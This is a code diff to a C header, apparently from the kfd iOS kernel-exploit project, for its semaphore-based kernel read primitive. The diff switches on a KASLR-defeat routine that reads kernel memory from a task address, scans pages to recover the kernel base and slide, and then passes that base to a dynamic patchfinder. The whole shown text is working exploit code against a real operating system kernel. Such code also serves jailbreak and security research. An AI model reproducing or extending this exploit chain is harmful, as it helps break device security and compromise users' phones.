@@ -5,6 +5,8 @@
 #ifndef kread_sem_open_h
 #define kread_sem_open_h
 
+#include "../../../fun/kpf/libdimentio.h"
+
 const char* kread_sem_open_name = "kfd-posix-semaphore";
 
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
@@ -99,8 +101,9 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
 
-    bool DEFEAT_KASLR = false;
+    bool DEFEAT_KASLR = true;
     if(DEFEAT_KASLR) {
+        //Step 1. break kaslr
         printf("task_kaddr: 0x%llx\n", task_kaddr);
         uint64_t something = 0;
         kread((u64)kfd, task_kaddr + 0x38, &something, sizeof(something));
@@ -124,6 +127,9 @@ void kread_sem_open_find_proc(struct kfd* kfd)
             something_page -= 0x1000;
         }
         printf("Got kbase: 0x%llx, got kslide: 0x%llx\n", something_page, something_page - 0xFFFFFFF007004000);
+        
+        //Step 2. run dynamic patchfinder
+        do_dynamic_patchfinder(kfd, something_page);
     }
         
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
